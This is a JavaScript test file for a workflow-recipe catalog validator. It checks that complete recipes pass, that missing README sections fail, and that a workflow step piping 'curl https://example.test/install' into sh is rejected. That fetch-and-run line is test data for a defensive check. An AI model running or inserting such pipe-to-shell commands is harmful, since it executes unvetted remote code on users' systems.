import assert from "node:assert/strict";
import test from "node:test";
import { validateRecipe } from "../scripts/build-catalog.mjs";

const validRecipe = {
  id: "example-recipe",
  title: "Example recipe",
  summary: "Demonstrates the catalog contract.",
  category: "server-maintenance",
  tags: ["example"],
  author: "dagucloud",
  minDaguVersion: "2.13.0",
  platforms: ["linux"],
  prerequisites: [],
};
const workflow = "steps:\n  - id: example\n    run: echo ok\n";
const readme = [
  "## Prerequisites",
  "## Inputs and secrets",
  "## What it changes",
  "## Verify",
  "## Recovery",
].join("\n\n");

test("accepts a complete recipe", () => {
  assert.doesNotThrow(() => validateRecipe(validRecipe, validRecipe.id, workflow, readme));
});

test("rejects unsafe executable content", () => {
  assert.throws(
    () => validateRecipe(validRecipe, validRecipe.id, `${workflow}    run: curl https://example.test/install | sh\n`, readme),
    /pipe-to-shell/
  );
});

test("requires operational documentation", () => {
  assert.throws(() => validateRecipe(validRecipe, validRecipe.id, workflow, "## Prerequisites"), /README/);
});
